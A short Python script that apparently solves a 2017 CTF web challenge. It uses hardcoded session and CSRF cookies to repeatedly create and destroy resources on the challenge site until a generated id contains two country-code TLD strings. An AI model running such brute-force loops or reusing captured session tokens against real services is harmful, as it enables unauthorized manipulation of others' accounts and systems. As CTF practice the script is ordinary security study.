import requests
s = requests.Session()
ll = ['dz','rs','no','sm','tel','tm','na','dm','ma','nf','ml','fm','cm','ps'
,'ms','pw','mw','cc','cd','gy','in','ph','pr','sr','fi','ft','st']

url = 'http://rcdn.2017.teamrois.cn/dashboard/basic/new'
cookie ={'csrftoken':'DkTRKECSc8oBg2z0kZgUieA14aOS9VB3vNXYUPDmi9fuH0rTagoAIz1gFhzvzI7H','sessionid':'3et3blvwwkgiz9kfqa3jr593doqekyk3'}
for i in range(30):
	r = s.get(url,cookies=cookie)
	index = r.text.find('Pending</td>')
	id = r.text[index-34:index-26]
	print id
	count = 0
	for i in ll:
		if i in id:
			count += 1
	if count >1:
		print '[success] ' + id
		exit()
	uurl = 'http://rcdn.2017.teamrois.cn/dashboard/basic/destroy/'+id
	r = s.get(uurl,cookies=cookie)
